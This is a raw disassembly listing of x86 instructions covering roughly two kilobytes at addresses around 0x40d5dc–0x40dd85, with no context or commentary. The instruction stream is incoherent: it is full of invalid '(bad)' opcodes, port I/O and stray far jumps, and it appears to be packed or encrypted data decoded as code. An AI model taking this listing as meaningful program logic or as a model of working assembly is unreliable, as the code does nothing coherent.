  40d5dc:	jle    0x40d5e6
  40d5de:	sti    
  40d5df:	aas    
  40d5e0:	rcl    dl,cl
  40d5e2:	jno    0x40d65d
  40d5e4:	push   ebx
  40d5e5:	mov    eax,ds:0xb4388fea
  40d5ea:	dec    ebx
  40d5eb:	jmp    0x40d5ae
  40d5ed:	pop    es
  40d5ee:	dec    ebx
  40d5ef:	scas   eax,DWORD PTR es:[edi]
  40d5f0:	lods   eax,DWORD PTR ds:[esi]
  40d5f1:	inc    ebx
  40d5f2:	pop    ecx
  40d5f3:	jg     0x40d5b6
  40d5f5:	cld    
  40d5f6:	sti    
  40d5f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f8:	shl    DWORD PTR [eax],0xf7
  40d5fb:	cmc    
  40d5fc:	mov    al,0xfe
  40d5fe:	sbb    esi,DWORD PTR [ebx+0x73c54353]
  40d604:	add    eax,0x876b3b92
  40d609:	mov    eax,0xa147fe4
  40d60e:	fdivr  DWORD PTR [edx+0x46cc2261]
  40d614:	rcl    bh,cl
  40d616:	push   es
  40d617:	pushf  
  40d618:	push   eax
  40d619:	mov    edx,0xea37b7a9
  40d61e:	out    0xb2,eax
  40d620:	ror    ch,cl
  40d622:	out    0xb2,eax
  40d624:	adc    eax,0x1d0bcd9
  40d629:	or     cl,BYTE PTR ds:[esi+0x6b]
  40d62d:	daa    
  40d62e:	pop    ds
  40d62f:	and    eax,0x12122b02
  40d634:	(bad)  
  40d635:	or     al,0x64
  40d637:	jne    0x40d621
  40d639:	data16 jle 0x40d62d
  40d63c:	icebp  
  40d63d:	repz sbb al,0x2a
  40d640:	inc    edi
  40d641:	fdivr  st(5),st
  40d643:	push   0x674a578d
  40d648:	call   0x3a83:0xd32dd3b1
  40d64f:	retf   0x22c4
  40d652:	outs   dx,BYTE PTR ds:[esi]
  40d653:	(bad)  
  40d654:	lea    esi,[edi+0x249ff9db]
  40d65a:	mov    ecx,0x2c8721da
  40d65f:	fs mov esi,0x30ff959
  40d665:	test   eax,0x6c4b4088
  40d66a:	cmp    edx,eax
  40d66c:	mov    WORD PTR [ebx+0x26],es
  40d66f:	ror    al,0x69
  40d672:	adc    eax,0xc8b1a5e3
  40d677:	or     ah,dh
  40d679:	into   
  40d67a:	ja     0x40d647
  40d67c:	in     al,dx
  40d67d:	bound  edx,QWORD PTR [ebp-0x38fcf387]
  40d683:	cs ins BYTE PTR es:[edi],dx
  40d685:	lods   al,BYTE PTR ds:[esi]
  40d686:	mov    bl,0x26
  40d688:	inc    esi
  40d689:	jle    0x40d6df
  40d68b:	dec    esp
  40d68c:	adc    BYTE PTR [edx+0x18],ch
  40d68f:	jno    0x40d628
  40d691:	loopne 0x40d657
  40d693:	ret    
  40d694:	nop
  40d695:	not    DWORD PTR [ebx-0x27]
  40d698:	mov    DWORD PTR [edi],edx
  40d69a:	cmp    al,0xc7
  40d69c:	mov    ds:0xa2bd4375,al
  40d6a1:	shl    DWORD PTR [ebp+0x4d],0x8e
  40d6a5:	je     0x40d71b
  40d6a7:	out    dx,al
  40d6a8:	mov    edi,0xa905e423
  40d6ad:	mov    al,ds:0x4492c613
  40d6b2:	mov    ecx,0x3bfb8a97
  40d6b7:	adc    DWORD PTR [edi+0x6d631386],edi
  40d6bd:	inc    ebp
  40d6be:	neg    BYTE PTR [esp+eax*8]
  40d6c1:	les    esp,FWORD PTR [eax]
  40d6c3:	lds    ebp,FWORD PTR [edi-0x5a]
  40d6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6c7:	inc    ebp
  40d6c8:	or     ebp,0xf4ea47b0
  40d6ce:	cli    
  40d6cf:	push   eax
  40d6d0:	mov    dl,0x3d
  40d6d2:	cmp    BYTE PTR [esi],cl
  40d6d4:	in     al,dx
  40d6d5:	fst    DWORD PTR [edx]
  40d6d7:	leave  
  40d6d8:	sbb    al,BYTE PTR [ebx-0x56]
  40d6db:	ds xchg ebx,eax
  40d6dd:	jmp    0xa27dd0c0
  40d6e2:	bound  edi,QWORD PTR [edx]
  40d6e4:	mov    ah,0x71
  40d6e6:	shr    BYTE PTR [ebx],cl
  40d6e8:	push   esp
  40d6e9:	into   
  40d6ea:	not    DWORD PTR [esi+0x2f]
  40d6ed:	push   esi
  40d6ee:	fs sahf 
  40d6f0:	sar    BYTE PTR [ebx+0x32c8cf96],cl
  40d6f6:	aam    0x95
  40d6f8:	outs   dx,BYTE PTR ds:[esi]
  40d6f9:	add    ebx,DWORD PTR [edx]
  40d6fb:	jbe    0x40d6bf
  40d6fd:	loopne 0x40d71a
  40d6ff:	adc    bh,BYTE PTR [edx-0x6a32f45a]
  40d705:	fucomi st,st(1)
  40d707:	je     0x40d710
  40d709:	aas    
  40d70a:	xchg   esp,eax
  40d70b:	jg     0x40d6e3
  40d70d:	push   edx
  40d70e:	fdiv   QWORD PTR [ebp+edi*2-0x44f9f480]
  40d715:	sub    BYTE PTR [esi+eiz*4+0x3a3b07c7],ch
  40d71c:	and    DWORD PTR cs:[esi],edx
  40d71f:	aas    
  40d720:	jmp    0xd903:0x2813ef6d
  40d727:	add    eax,0x2099090b
  40d72c:	daa    
  40d72d:	int3   
  40d72e:	jo     0x40d7a9
  40d730:	(bad)  
  40d731:	rcl    edi,1
  40d733:	sub    al,0x7f
  40d735:	jl     0x40d765
  40d737:	inc    dl
  40d739:	cmp    eax,esi
  40d73b:	mov    ah,0x3d
  40d73d:	and    BYTE PTR [ecx],cl
  40d73f:	loop   0x40d745
  40d741:	ss sbb al,0x60
  40d744:	popf   
  40d745:	mov    esp,0x8d477b1e
  40d74a:	mov    dl,0xdd
  40d74c:	out    dx,eax
  40d74d:	imul   edi,DWORD PTR [edi],0x7909eb84
  40d753:	or     eax,0x52ab2c8d
  40d758:	add    DWORD PTR [ebp+0xd5af68c],esp
  40d75e:	lahf   
  40d75f:	loop   0x40d74a
  40d761:	mov    esi,0x66a488ef
  40d766:	mov    ecx,0x1b43fd68
  40d76b:	or     BYTE PTR [ebx],dl
  40d76d:	xchg   ecx,eax
  40d76e:	inc    ecx
  40d76f:	sub    bl,BYTE PTR [eax+0x720dc297]
  40d775:	mov    ch,0x4c
  40d777:	in     al,0x81
  40d779:	xchg   DWORD PTR [esi+0x2d37467e],esi
  40d77f:	dec    edx
  40d780:	sub    eax,0xadb113d9
  40d785:	mov    ch,BYTE PTR [ecx]
  40d787:	xor    eax,0x106e2e0a
  40d78c:	fst    st(5)
  40d78e:	and    al,0x7a
  40d790:	sub    BYTE PTR [edi+0x51ac6395],dl
  40d796:	addr16 leave 
  40d798:	inc    esp
  40d799:	sub    DWORD PTR [ecx-0x47f6a6cb],esi
  40d79f:	dec    ebp
  40d7a0:	in     eax,0x95
  40d7a2:	pop    es
  40d7a3:	sub    BYTE PTR [edx],0xd0
  40d7a6:	or     BYTE PTR [ebx-0x1951ecb4],bl
  40d7ac:	and    dh,bl
  40d7ae:	jnp    0x40d7cb
  40d7b0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40d7b2:	cli    
  40d7b3:	out    0xd1,al
  40d7b5:	push   eax
  40d7b6:	inc    edi
  40d7b7:	dec    eax
  40d7b8:	rcr    ah,0x2d
  40d7bb:	cmp    al,0x12
  40d7be:	icebp  
  40d7bf:	jmp    0xccd7:0x24830878
  40d7c6:	xchg   ebp,eax
  40d7c7:	popa   
  40d7c8:	xlat   BYTE PTR ds:[ebx]
  40d7c9:	lahf   
  40d7ca:	fsubrp st(3),st
  40d7cc:	ins    DWORD PTR es:[edi],dx
  40d7cd:	fsubr  DWORD PTR fs:[ebp-0x5fce8db5]
  40d7d4:	mov    ebp,0xf1a60e34
  40d7d9:	or     esp,esi
  40d7db:	pop    edx
  40d7dc:	xor    ecx,DWORD PTR [esi+ecx*4-0x75cf0a06]
  40d7e3:	jbe    0x40d846
  40d7e5:	add    al,0xbc
  40d7e7:	cli    
  40d7e8:	add    eax,DWORD PTR ds:0xebf58c0c
  40d7ee:	add    al,0xef
  40d7f0:	xchg   DWORD PTR ds:0x162b6a90,esi
  40d7f6:	and    cl,cl
  40d7f8:	aad    0x50
  40d7fa:	(bad)  
  40d7fb:	js     0x40d7f8
  40d7fd:	inc    edi
  40d7fe:	js     0x40d7b2
  40d800:	and    ecx,esi
  40d802:	in     eax,dx
  40d803:	jmp    0xe1f625a
  40d808:	lea    esp,[eax-0x1]
  40d80b:	repnz dec edi
  40d80d:	out    0xf8,al
  40d80f:	push   eax
  40d810:	mov    eax,ds:0xd5d8b196
  40d815:	pop    edi
  40d816:	cmc    
  40d817:	ins    DWORD PTR es:[edi],dx
  40d818:	cld    
  40d819:	inc    edx
  40d81a:	lods   eax,DWORD PTR ds:[esi]
  40d81b:	pop    ecx
  40d81c:	sbb    cl,BYTE PTR [ebx]
  40d81e:	push   ebp
  40d81f:	jns    0x40d7df
  40d821:	inc    edx
  40d822:	mov    al,ds:0x832cdcc4
  40d827:	mov    eax,ds:0x7b4ec13e
  40d82c:	cmp    ah,BYTE PTR [ebp+ebx*1+0x73d4241f]
  40d833:	cwde   
  40d834:	push   edi
  40d835:	stos   DWORD PTR es:[edi],eax
  40d836:	fsub   st,st(0)
  40d838:	pop    es
  40d839:	arpl   WORD PTR [edi+0x306f7ad2],di
  40d83f:	fdivp  st(0),st
  40d841:	call   0xfc14a0d
  40d846:	outs   dx,BYTE PTR ds:[esi]
  40d847:	outs   dx,BYTE PTR ds:[esi]
  40d848:	xchg   DWORD PTR ds:0xc6400d7e,esi
  40d84e:	sub    DWORD PTR [ebp+0x1c04cbb4],ebp
  40d854:	and    esp,eax
  40d856:	out    0x23,eax
  40d858:	or     DWORD PTR es:[esp+edi*4],esi
  40d85c:	das    
  40d85d:	jo     0x40d7f6
  40d85f:	sub    eax,DWORD PTR [ebp-0x66]
  40d862:	scas   eax,DWORD PTR es:[edi]
  40d863:	arpl   WORD PTR [esi],bp
  40d865:	xlat   BYTE PTR ds:[ebx]
  40d866:	lods   eax,DWORD PTR ds:[esi]
  40d867:	(bad)  
  40d868:	outs   dx,BYTE PTR ds:[esi]
  40d869:	fs test ebx,0xefe8ea23
  40d870:	sub    ebx,DWORD PTR [eax]
  40d872:	jb     0x40d7fe
  40d874:	sub    bl,0xc3
  40d877:	sti    
  40d878:	inc    eax
  40d879:	jge    0x40d895
  40d87b:	and    al,0x54
  40d87d:	mov    BYTE PTR [eax],cl
  40d87f:	das    
  40d880:	xchg   esp,eax
  40d881:	mov    cs,WORD PTR [ebx-0x18]
  40d884:	(bad)  
  40d885:	sub    esp,ecx
  40d887:	ins    BYTE PTR es:[edi],dx
  40d888:	and    ah,0x7a
  40d88b:	bound  esp,QWORD PTR [edi+esi*2+0x60defc1]
  40d892:	sbb    al,0x75
  40d894:	arpl   ax,di
  40d896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d897:	jae    0x40d876
  40d899:	sub    al,0x76
  40d89b:	pop    eax
  40d89c:	hlt    
  40d89d:	rcl    DWORD PTR [ecx+0x6700e589],cl
  40d8a3:	push   eax
  40d8a4:	int3   
  40d8a5:	rol    DWORD PTR [ebx-0x7d09b505],cl
  40d8ab:	mov    esi,0x53cd6083
  40d8b0:	inc    ebp
  40d8b1:	ss popf 
  40d8b3:	jecxz  0x40d8f7
  40d8b5:	pop    ebx
  40d8b6:	cmp    eax,0x5f2894dc
  40d8bb:	ret    0xd91b
  40d8be:	mov    ds:0x2c3fd34a,eax
  40d8c3:	or     al,BYTE PTR [esp+ecx*1]
  40d8c6:	push   esp
  40d8c7:	dec    esi
  40d8c8:	push   ds
  40d8c9:	ss cli 
  40d8cb:	adc    ebp,DWORD PTR [edi+0x6e413370]
  40d8d1:	rcr    dh,1
  40d8d3:	out    0x21,al
  40d8d5:	das    
  40d8d6:	mov    ch,0xb1
  40d8d8:	jmp    edx
  40d8da:	pop    es
  40d8db:	push   0xbd50215
  40d8e0:	adc    DWORD PTR [ecx+0x52],ebx
  40d8e3:	fbld   TBYTE PTR [ebp+edx*1-0xd02e9b2]
  40d8ea:	xchg   esp,eax
  40d8eb:	sub    ebp,DWORD PTR [esi+0x6c108250]
  40d8f1:	add    BYTE PTR [eax+0x12],al
  40d8f4:	repnz (bad) 
  40d8f7:	jmp    0x61ea:0x391a4409
  40d8fe:	push   ss
  40d8ff:	jmp    0x40d916
  40d901:	sar    BYTE PTR ds:0x921c364,cl
  40d907:	loopne 0x40d8ae
  40d909:	xchg   BYTE PTR [ecx-0x19],ch
  40d90c:	jae    0x40d910
  40d90e:	int    0xe2
  40d910:	sti    
  40d911:	in     eax,dx
  40d912:	push   eax
  40d913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d914:	cdq    
  40d915:	cmp    al,BYTE PTR [eax+0x11]
  40d918:	ror    DWORD PTR [ebx-0x3c8c0443],cl
  40d91e:	jns    0x40d8cd
  40d920:	lods   eax,DWORD PTR ds:[esi]
  40d921:	cmp    eax,0x2ce9da01
  40d926:	sbb    eax,0x1ba870c1
  40d92b:	jbe    0x40d8eb
  40d92d:	mov    DWORD PTR [edi-0x5a2438e0],esp
  40d933:	add    edx,DWORD PTR es:[esi+0x42f7431b]
  40d93a:	cli    
  40d93b:	popa   
  40d93c:	aad    0x90
  40d93e:	stos   DWORD PTR es:[edi],eax
  40d93f:	jno    0x40d8ee
  40d941:	xchg   esi,eax
  40d942:	out    0x7b,al
  40d944:	mov    dh,0x56
  40d946:	retf   
  40d947:	adc    DWORD PTR [eax-0x4ca02d3b],edi
  40d94d:	mov    ah,BYTE PTR [ebx-0x45]
  40d950:	or     eax,0x2129ce9f
  40d955:	xor    cl,ch
  40d957:	(bad)  
  40d958:	mov    eax,DWORD PTR [edx]
  40d95a:	mov    ebp,0x7089cf41
  40d95f:	es inc edi
  40d961:	mov    esp,0xb029c2bc
  40d966:	adc    edx,DWORD PTR [ebx+eax*1+0x597ebfe2]
  40d96d:	fst    QWORD PTR [edi-0x3090f46b]
  40d973:	call   0xc77c:0x8a5ce849
  40d97a:	mov    al,0xd6
  40d97c:	dec    edi
  40d97d:	dec    ebx
  40d97e:	icebp  
  40d97f:	fwait
  40d980:	push   cs
  40d981:	jbe    0x40d9cf
  40d983:	mov    ebp,0x272af17c
  40d988:	dec    eax
  40d989:	ja     0x40d94d
  40d98b:	jns    0x40d9a1
  40d98d:	sbb    eax,0xba7a6c60
  40d992:	in     eax,dx
  40d993:	cmc    
  40d994:	jp     0x40d98a
  40d996:	js     0x40d9b6
  40d998:	es jmp 0xdd8c65db
  40d99e:	mov    bh,0xd2
  40d9a0:	shl    BYTE PTR [eax+edx*4-0x37],1
  40d9a4:	popf   
  40d9a5:	cmp    DWORD PTR [ebp+ecx*8-0x77186578],eax
  40d9ac:	test   eax,0xc579b8f0
  40d9b1:	adc    dl,0x25
  40d9b4:	mov    dh,0x51
  40d9b6:	call   0xc4f:0x26e61dc8
  40d9bd:	xlat   BYTE PTR ds:[ebx]
  40d9be:	mov    bl,dl
  40d9c0:	adc    dl,bh
  40d9c2:	in     eax,0x38
  40d9c4:	add    edx,0x62231b19
  40d9ca:	xchg   esp,eax
  40d9cb:	aam    0x52
  40d9cd:	(bad)  [edx+0x37d80283]
  40d9d3:	xor    BYTE PTR [ebp-0x4945b42b],bh
  40d9d9:	mov    bl,0xdf
  40d9db:	mov    eax,0x8ef8cded
  40d9e0:	or     ah,bh
  40d9e2:	lea    edi,[ebx+ebx*1+0x108ee2a0]
  40d9e9:	add    ah,dh
  40d9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ec:	(bad)  
  40d9ed:	cmp    cl,BYTE PTR [esi-0x4fb23779]
  40d9f3:	push   0x2f
  40d9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f6:	mov    ah,0xa1
  40d9f8:	sub    ah,BYTE PTR [ecx-0x2b]
  40d9fb:	outs   dx,DWORD PTR ds:[esi]
  40d9fc:	xlat   BYTE PTR ds:[ebx]
  40d9fd:	or     BYTE PTR [esi+esi*2-0x41],0x58
  40da02:	lahf   
  40da03:	test   BYTE PTR [esi+0x1e3faf7],dh
  40da09:	int3   
  40da0a:	inc    eax
  40da0b:	es adc ch,bh
  40da0e:	mov    ah,0x4e
  40da10:	xor    BYTE PTR [edx+0x60df308d],al
  40da16:	aam    0xca
  40da18:	xor    BYTE PTR [eax+ebp*8-0x215111cf],bh
  40da1f:	arpl   WORD PTR [edx+ebp*8+0x53],sp
  40da23:	aam    0xa5
  40da25:	outs   dx,DWORD PTR ds:[esi]
  40da26:	rcl    BYTE PTR [esi],0xc1
  40da29:	mov    ecx,eax
  40da2b:	xor    BYTE PTR [edi],ch
  40da2d:	in     eax,0x25
  40da2f:	dec    ebp
  40da30:	dec    ecx
  40da31:	cmp    DWORD PTR [edi+ecx*2],ecx
  40da34:	lea    ecx,[esi+0x1]
  40da37:	shr    BYTE PTR [edx],0xe
  40da3a:	mov    dh,BYTE PTR [esi+0x38c4e0ac]
  40da40:	(bad)  
  40da42:	ja     0x40d9d0
  40da44:	inc    ecx
  40da45:	into   
  40da46:	pop    ds
  40da47:	daa    
  40da48:	or     ah,bl
  40da4a:	jp     0x40da1d
  40da4c:	dec    ecx
  40da4d:	inc    edx
  40da4e:	bound  ecx,QWORD PTR [eax]
  40da50:	cmovo  esi,DWORD PTR [eax]
  40da53:	push   ds
  40da54:	mov    ah,bl
  40da56:	iret   
  40da57:	js     0x40da0c
  40da59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da5a:	int    0x9f
  40da5c:	add    DWORD PTR [ecx+edx*2-0x5aa64fe9],esi
  40da63:	pop    esp
  40da64:	xchg   esp,eax
  40da65:	push   edi
  40da66:	jno    0x40da02
  40da68:	sub    DWORD PTR [ebp+0x1fa7d4fe],esp
  40da6e:	xor    eax,0xb6a89f1d
  40da73:	out    dx,al
  40da74:	outs   dx,DWORD PTR ds:[esi]
  40da75:	js     0x40da70
  40da77:	popa   
  40da78:	imul   edx,DWORD PTR [esi],0x84452f30
  40da7e:	push   eax
  40da7f:	ror    BYTE PTR [edi+0xd13c875],1
  40da85:	sar    BYTE PTR [ecx+esi*2+0x6],1
  40da89:	sub    bl,0xe5
  40da8c:	scas   al,BYTE PTR es:[edi]
  40da8d:	add    DWORD PTR [edi-0xc],eax
  40da90:	sbb    bh,BYTE PTR [edi]
  40da92:	iret   
  40da93:	dec    esp
  40da94:	sbb    eax,0xf67aac0a
  40da99:	jb     0x40daae
  40da9b:	jno    0x40dab7
  40da9d:	xchg   ebx,eax
  40da9e:	mov    dh,0xdd
  40daa0:	pop    eax
  40daa1:	jbe    0x40da2c
  40daa3:	jge    0x40dac8
  40daa5:	jmp    0x40da30
  40daa7:	pop    ebx
  40daa8:	xor    BYTE PTR [edi-0x20],bl
  40daab:	adc    cl,0x96
  40daae:	cmp    BYTE PTR [esi],0x60
  40dab1:	out    0xf7,al
  40dab3:	data16 mov WORD PTR [ecx],?
  40dab6:	push   eax
  40dab7:	fadd   QWORD PTR [esi+edx*4+0x14]
  40dabb:	scas   eax,DWORD PTR es:[edi]
  40dabc:	pusha  
  40dabd:	fcomip st,st(7)
  40dabf:	mov    ebp,0x4e39c7dd
  40dac4:	sahf   
  40dac5:	xchg   DWORD PTR [edx],esp
  40dac7:	lods   eax,DWORD PTR ds:[esi]
  40dac8:	jno    0x40dae6
  40daca:	jno    0x40db0d
  40dacc:	(bad)  
  40dacd:	sbb    edi,ebp
  40dacf:	sub    eax,0x54ea622
  40dad4:	loopne 0x40db12
  40dad6:	mov    gs,WORD PTR [ebx+0x62d00133]
  40dadc:	out    dx,eax
  40dadd:	push   ebx
  40dade:	call   0x5a9fa8eb
  40dae3:	jge    0x40da7a
  40dae5:	or     BYTE PTR [edi+0x5b],ch
  40dae8:	sbb    DWORD PTR [bx-0x61],edx
  40daec:	icebp  
  40daed:	(bad)  
  40daee:	nop
  40daef:	ds in  al,dx
  40daf1:	push   edi
  40daf2:	and    cl,BYTE PTR [ebp+ebp*4+0x19]
  40daf6:	mov    ch,0x61
  40daf8:	call   0xef29:0x712b3b35
  40daff:	jl     0x40da9f
  40db01:	xlat   BYTE PTR ds:[ebx]
  40db02:	bound  ecx,QWORD PTR [edx-0x41223c69]
  40db08:	scas   eax,DWORD PTR es:[edi]
  40db09:	fs pop ecx
  40db0b:	sti    
  40db0c:	sub    al,0xdd
  40db0e:	cs addr16 dec ebp
  40db11:	aaa    
  40db12:	outs   dx,DWORD PTR ds:[esi]
  40db13:	int3   
  40db14:	sub    edi,edx
  40db16:	push   es
  40db17:	lea    esi,gs:[ebx-0xed67e44]
  40db1e:	adc    ah,bh
  40db20:	int    0xc1
  40db22:	shl    dl,0x67
  40db25:	pop    ebp
  40db26:	lahf   
  40db27:	out    0xe3,al
  40db29:	dec    DWORD PTR [esi-0x1e82e0a2]
  40db2f:	push   0xc404b303
  40db34:	xchg   DWORD PTR [ebp+ecx*8-0x2576d92f],esp
  40db3b:	jmp    0x40db45
  40db3d:	ret    0xa07e
  40db40:	iret   
  40db41:	xor    bh,BYTE PTR ds:0x89626f10
  40db47:	ss cdq 
  40db49:	std    
  40db4a:	mov    edi,0x699eda8f
  40db4f:	int    0xad
  40db51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db52:	out    0x35,eax
  40db54:	call   0xee56fc4d
  40db59:	(bad)  
  40db5a:	retf   
  40db5b:	add    al,0x5c
  40db5d:	inc    eax
  40db5e:	test   al,0x1d
  40db60:	and    DWORD PTR [eax+0x306f14e3],ebp
  40db66:	adc    DWORD PTR [esi+0xd],0x9f55545e
  40db6d:	mov    BYTE PTR [edx+0x4151b112],0x58
  40db74:	ja     0x40db9d
  40db76:	inc    edx
  40db77:	pop    esp
  40db78:	add    eax,0x2f09db04
  40db7d:	jne    0x40db6c
  40db7f:	mov    WORD PTR [ecx+0x25a32d45],fs
  40db85:	out    dx,al
  40db86:	leave  
  40db87:	sti    
  40db88:	push   eax
  40db89:	and    cl,BYTE PTR [edi-0x36f4a7e4]
  40db8f:	fs jbe 0x40db43
  40db92:	xchg   ebx,eax
  40db93:	adc    ebp,DWORD PTR [esi-0x6c]
  40db96:	test   cl,ch
  40db98:	push   es
  40db99:	not    DWORD PTR [ebp-0x7cdbdbde]
  40db9f:	cmp    eax,0xb57c0057
  40dba4:	add    ecx,esi
  40dba6:	ror    DWORD PTR [edi],0xc4
  40dba9:	add    BYTE PTR ds:0xf77ea80b,ch
  40dbaf:	add    DWORD PTR [ebx],eax
  40dbb1:	mov    eax,?
  40dbb3:	jae    0x40dc0a
  40dbb5:	rcl    bh,cl
  40dbb7:	jo     0x40dbb8
  40dbb9:	scas   eax,DWORD PTR es:[edi]
  40dbba:	inc    ecx
  40dbbb:	ficomp WORD PTR [edx-0x4d]
  40dbbe:	jmp    0x3299d07d
  40dbc3:	addr16 jmp 0x9bca831a
  40dbc9:	dec    esp
  40dbca:	push   esp
  40dbcb:	in     eax,dx
  40dbcc:	shl    dl,0x9e
  40dbcf:	push   ds
  40dbd0:	outs   dx,BYTE PTR ds:[esi]
  40dbd1:	sub    al,BYTE PTR [edi+0x61021546]
  40dbd7:	dec    ecx
  40dbd8:	xor    ebx,DWORD PTR [esi]
  40dbda:	adc    dl,BYTE PTR [edx-0x5e]
  40dbdd:	js     0x40db60
  40dbdf:	or     BYTE PTR [eax-0x6d],cl
  40dbe2:	in     eax,dx
  40dbe3:	jbe    0x40dba4
  40dbe5:	push   ecx
  40dbe6:	call   0xf1fc:0xf0af6c5c
  40dbed:	lods   eax,DWORD PTR ds:[esi]
  40dbee:	mov    dh,0xd6
  40dbf0:	loopne 0x40dc1a
  40dbf2:	xor    edi,esi
  40dbf4:	pmulhw mm4,QWORD PTR [edi+esi*2-0x4573f1e4]
  40dbfc:	adc    eax,DWORD PTR [eax-0x43af6677]
  40dc02:	addr16 jmp 0x40dbc2
  40dc05:	enter  0x97bf,0xb9
  40dc09:	lock into 
  40dc0b:	mov    si,0x25d4
  40dc0f:	jns    0x40dc38
  40dc11:	(bad)  
  40dc12:	mov    ebp,0xd3ff0ff
  40dc17:	sub    al,0x47
  40dc19:	mov    BYTE PTR [edi],al
  40dc1b:	fidivr WORD PTR [eax+0x19d797b]
  40dc21:	sbb    eax,0xc17fa879
  40dc26:	rcl    DWORD PTR [edi-0x41905f05],1
  40dc2c:	jle    0x40dc88
  40dc2e:	xchg   ecx,eax
  40dc2f:	repnz (bad) 
  40dc31:	push   ss
  40dc32:	inc    esi
  40dc33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc34:	sbb    eax,0x3286296c
  40dc39:	xor    al,0xda
  40dc3b:	xchg   ebx,eax
  40dc3c:	xor    al,0x46
  40dc3e:	xchg   BYTE PTR [eax],bh
  40dc40:	mov    WORD PTR [edi+0x1f],?
  40dc43:	nop
  40dc44:	pop    edi
  40dc45:	inc    eax
  40dc46:	sbb    BYTE PTR [ecx-0x24],dl
  40dc49:	shl    edx,cl
  40dc4b:	fsub   st(4),st
  40dc4d:	hlt    
  40dc4e:	jns    0x40dca4
  40dc50:	and    DWORD PTR [edi-0x54],ecx
  40dc53:	int3   
  40dc54:	fbstp  TBYTE PTR [ebp+0x30c6be6b]
  40dc5a:	fwait
  40dc5b:	cmp    ch,BYTE PTR [ecx-0x30cdbc5e]
  40dc61:	inc    esp
  40dc62:	or     ebp,esi
  40dc64:	mov    ecx,0xd1ff139d
  40dc69:	aas    
  40dc6a:	mov    dl,0x6a
  40dc6c:	sub    dh,BYTE PTR [edx+esi*1+0xaf776a4]
  40dc73:	mov    dh,0xeb
  40dc75:	repnz cmc 
  40dc77:	out    0xa9,eax
  40dc79:	add    eax,0x753c4965
  40dc7e:	iret   
  40dc7f:	pop    edi
  40dc80:	in     eax,0x1
  40dc82:	mov    ds:0x5251aa42,al
  40dc87:	rcl    DWORD PTR ds:0xbe139241,1
  40dc8d:	mov    al,ds:0x4702d794
  40dc92:	ins    DWORD PTR es:[edi],dx
  40dc93:	jne    0x40dd0b
  40dc95:	mov    al,ds:0x875b1882
  40dc9a:	ficomp WORD PTR [ebx+0x63]
  40dc9d:	adc    DWORD PTR [eax+0x54b9fc3b],edi
  40dca3:	sti    
  40dca4:	jne    0x40dc9e
  40dca6:	mov    ds:0x8c5c8274,al
  40dcab:	lods   al,BYTE PTR ds:[esi]
  40dcac:	inc    ebp
  40dcad:	jp     0x40dc93
  40dcaf:	outs   dx,DWORD PTR ds:[esi]
  40dcb0:	push   ebp
  40dcb1:	dec    eax
  40dcb2:	scas   al,BYTE PTR es:[edi]
  40dcb3:	js     0x40dcd1
  40dcb5:	jl     0x40dc56
  40dcb7:	rol    DWORD PTR [ecx+0x44],0x56
  40dcbb:	mov    edi,0x73f751d5
  40dcc0:	inc    edx
  40dcc1:	out    0x3f,eax
  40dcc3:	mov    al,0x76
  40dcc5:	loop   0x40dd45
  40dcc7:	imul   edx,DWORD PTR [ecx+0x4f0f5626],0x267d5bc0
  40dcd1:	lea    esi,[esi+ecx*1+0x13ac881b]
  40dcd8:	call   0x9a3:0xb67db0a2
  40dcdf:	js     0x40dd4c
  40dce1:	push   esp
  40dce2:	mov    ecx,ebp
  40dce4:	mov    ebp,0x5371490d
  40dce9:	dec    ebx
  40dcea:	jg     0x40dce5
  40dcec:	call   0x6e6:0x4dd8ff0f
  40dcf3:	popa   
  40dcf4:	ss ins DWORD PTR es:[edi],dx
  40dcf6:	mov    eax,ds:0xcd3e54a0
  40dcfb:	inc    eax
  40dcfc:	ret    0x7bb5
  40dcff:	sub    BYTE PTR [ecx+ecx*8],bl
  40dd02:	int    0xf7
  40dd04:	int3   
  40dd05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd06:	out    0x62,eax
  40dd08:	mov    al,0x95
  40dd0a:	sub    edx,edi
  40dd0c:	adc    BYTE PTR [edi+eiz*8-0x212e359b],0xb4
  40dd14:	or     al,BYTE PTR [edi]
  40dd16:	(bad)
  40dd19:	jg     0x40dd0e
  40dd1b:	add    eax,0xed6fa9f
  40dd20:	cmc    
  40dd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd22:	cwde   
  40dd23:	cmp    cl,dl
  40dd25:	shr    DWORD PTR [eax+ecx*1],1
  40dd28:	mov    bl,cl
  40dd2a:	mov    ?,WORD PTR [ebp+0x67bd0ab9]
  40dd30:	enter  0x1b82,0x50
  40dd34:	mov    edi,0x51944c10
  40dd39:	sub    al,0x8c
  40dd3b:	js     0x40dcda
  40dd3d:	pop    esp
  40dd3e:	mov    bl,0x16
  40dd40:	jbe    0x40dd03
  40dd42:	push   esp
  40dd43:	sub    eax,0x1fa4597b
  40dd48:	push   es
  40dd49:	test   dl,0xce
  40dd4c:	jmp    0xa71c:0x7e802553
  40dd53:	nop    DWORD PTR [ecx]
  40dd56:	ja     0x40dcf9
  40dd58:	out    0xf3,al
  40dd5a:	mov    dh,0xb7
  40dd5c:	fs stos BYTE PTR es:[edi],al
  40dd5e:	cdq    
  40dd5f:	sbb    BYTE PTR [edi+0x4d07da9],bh
  40dd65:	fimul  DWORD PTR [ebp-0x4d2eab85]
  40dd6b:	sbb    eax,DWORD PTR [esi-0xf]
  40dd6e:	push   ecx
  40dd6f:	shr    bl,1
  40dd71:	xchg   ecx,eax
  40dd72:	stc    
  40dd73:	pop    ss
  40dd74:	lahf   
  40dd75:	cs push cs
  40dd77:	pop    esi
  40dd78:	jno    0x40dd1c
  40dd7a:	jmp    0x40ddc9
  40dd7c:	sbb    BYTE PTR [edi],ch
  40dd7e:	stc    
  40dd7f:	inc    edx
  40dd80:	in     al,0x23
  40dd82:	add    al,0xf1
  40dd84:	push   es
  40dd85:	mov    cl,0xf7
